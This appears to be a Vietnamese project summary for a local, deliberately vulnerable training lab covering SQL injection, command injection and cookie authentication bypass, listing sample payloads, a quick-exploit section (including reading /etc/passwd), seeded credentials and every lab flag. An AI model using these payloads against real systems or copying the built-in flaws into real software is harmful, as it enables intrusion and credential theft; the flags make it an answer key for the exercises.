# 📊 Tóm Tắt Dự Án Security Lab

## ✅ Đã Hoàn Thành

### 🏠 Trang Chủ

-   URL: `http://localhost:3000/`
-   Hiển thị 3 lab đã hoàn thành + 1 lab sắp ra mắt
-   Giao diện đẹp, responsive

### 🔬 Lab 1: SQL Injection

-   **URL:** `http://localhost:3000/lab/sqli`
-   **Tính năng:**
    -   Hiển thị tất cả 5 posts ngay khi vào
    -   Thanh search với lỗ hổng SQL injection
    -   Hiển thị query SQL đang thực thi
    -   Gợi ý từng bước khai thác
-   **FLAG:** `FLAG{SQL_1nj3ct10n_M4st3r}`
-   **Payload mẫu:** `' UNION SELECT id, flag FROM secret--`

### 🔬 Lab 2: Command Injection

-   **URL:** `http://localhost:3000/lab/cmdi`
-   **Tính năng:**
    -   Công cụ ping IP/domain
    -   Command injection không filter
    -   Hiển thị command đang thực thi
    -   Gợi ý và hướng dẫn phòng chống
-   **FLAG:** `FLAG{C0mm4nd_1nj3ct10n_M4st3r_2024}`
-   **Payload mẫu:** `8.8.8.8; cat secret.txt`

### 🔬 Lab 3: Authentication Bypass

-   **URL:** `http://localhost:3000/lab/auth`
-   **Tính năng:**
    -   Hệ thống login với form đăng nhập
    -   Cookie lưu username:password (plaintext)
    -   Bảng tin comments với post comment
    -   Bypass authentication để đăng nhập admin
    -   Gợi ý và hướng dẫn bảo mật
-   **FLAG:** `FLAG{4uth_Byp4ss_C00k13_H4ck}`
-   **Payload mẫu:** Cookie = `admin:admin123`

## 📁 Cấu Trúc Dự Án

```
lelel/
├── 📄 server.js                 # Server Express với lỗ hổng
├── 📄 package.json              # Dependencies
├── 🗄️ lab.db                    # SQLite database
├── 🚩 secret.txt                # File bí mật (Command Injection)
│
├── 📁 views/                    # Templates EJS
│   ├── index.ejs               # Trang chủ
│   ├── sqli-lab.ejs            # Lab SQL Injection
│   └── cmdi-lab.ejs            # Lab Command Injection
│
├── 📁 public/css/               # Giao diện
│   └── style.css               # CSS chính
│
└── 📁 docs/                     # Tài liệu
    ├── README.md               # Tài liệu chính
    ├── DEMO.md                 # Hướng dẫn SQL Injection
    ├── CMDI-GUIDE.md           # Hướng dẫn Command Injection
    ├── QUICKSTART.md           # Bắt đầu nhanh
    ├── CHANGELOG.md            # Lịch sử thay đổi
    ├── INFO.txt                # Thông tin tổng quan
    └── SUMMARY.md              # File này
```

## 🗄️ Database (SQLite)

### Bảng `posts` (5 bài viết)

| ID  | Title                          |
| --- | ------------------------------ |
| 1   | Chào mừng đến với Security Lab |
| 2   | SQL Injection là gì?           |
| 3   | Bảo mật web căn bản            |
| 4   | OWASP Top 10                   |
| 5   | Cross-Site Scripting (XSS)     |

### Bảng `users` (3 users)

| Username | Password  | Email           |
| -------- | --------- | --------------- |
| admin    | admin123  | admin@lab.local |
| user1    | password1 | user1@lab.local |
| user2    | password2 | user2@lab.local |

### Bảng `secret` (1 flag SQL Injection)

| ID  | Flag                       |
| --- | -------------------------- |
| 1   | FLAG{SQL_1nj3ct10n_M4st3r} |

### Bảng `comments` (4 comments)

| ID  | Username | Comment                                    |
| --- | -------- | ------------------------------------------ |
| 1   | admin    | Chào mừng đến với hệ thống!                |
| 2   | admin    | 🚩 FLAG: FLAG{4uth_Byp4ss_C00k13_H4ck} ... |
| 3   | user1    | Tính năng rất hay!                         |
| 4   | user2    | Mình đã đăng nhập thành công!              |

## 🎯 Khai Thác Nhanh

### SQL Injection

```sql
-- Phát hiện lỗ hổng
'

-- Lấy flag
' UNION SELECT id, flag FROM secret--

-- Lấy users
' UNION SELECT username, password FROM users--

-- Xem các bảng
' UNION SELECT 1, name FROM sqlite_master WHERE type='table'--
```

### Command Injection

```bash
# Phát hiện lỗ hổng
8.8.8.8; whoami

# Liệt kê file
8.8.8.8; ls -la

# Lấy FLAG
8.8.8.8; cat secret.txt

# Đọc file hệ thống
8.8.8.8; cat /etc/passwd
```

## 🛠️ Tech Stack

-   **Backend:** Node.js 18+ + Express 4.x
-   **Database:** SQLite3
-   **Template:** EJS
-   **Frontend:** HTML5, CSS3, Vanilla JavaScript

## 📚 Tài Liệu

| File            | Mô tả                                    |
| --------------- | ---------------------------------------- |
| `README.md`     | Tài liệu tổng quan, hướng dẫn cài đặt    |
| `DEMO.md`       | Hướng dẫn chi tiết SQL Injection Lab     |
| `CMDI-GUIDE.md` | Hướng dẫn chi tiết Command Injection Lab |
| `QUICKSTART.md` | Hướng dẫn bắt đầu nhanh                  |
| `CHANGELOG.md`  | Lịch sử thay đổi version                 |
| `INFO.txt`      | Thông tin tổng quan (ASCII art)          |

## 🚀 Chạy Dự Án

```bash
# Cài đặt
npm install

# Khởi động
npm start

# Truy cập
http://localhost:3000
```

## 🔒 Lưu Ý Bảo Mật

⚠️ **QUAN TRỌNG:**

-   Dự án này có lỗ hổng **CỐ TÌNH** cho mục đích học tập
-   **KHÔNG** sử dụng code này trong production
-   **KHÔNG** deploy lên server public
-   Chỉ sử dụng trong môi trường local/lab

## ✨ Điểm Nổi Bật

1. ✅ Giao diện đẹp, hiện đại
2. ✅ Hướng dẫn chi tiết từng bước
3. ✅ Hiển thị query/command đang thực thi
4. ✅ Gợi ý phòng chống lỗ hổng
5. ✅ Tài liệu đầy đủ

## 🎓 Mục Đích Giáo Dục

Dự án giúp:

-   Hiểu cách hoạt động của SQL Injection và Command Injection
-   Nhận biết code không an toàn
-   Học cách khai thác lỗ hổng
-   Biết cách viết code an toàn hơn

## 🔑 All FLAGS

| Lab                   | FLAG                                  |
| --------------------- | ------------------------------------- |
| SQL Injection         | `FLAG{SQL_1nj3ct10n_M4st3r}`          |
| Command Injection     | `FLAG{C0mm4nd_1nj3ct10n_M4st3r_2024}` |
| Authentication Bypass | `FLAG{4uth_Byp4ss_C00k13_H4ck}`       |

---

**Version:** 1.3.0  
**Ngày cập nhật:** 2025-10-16  
**Tác giả:** Security Lab Team  
**License:** MIT (Educational Use Only)
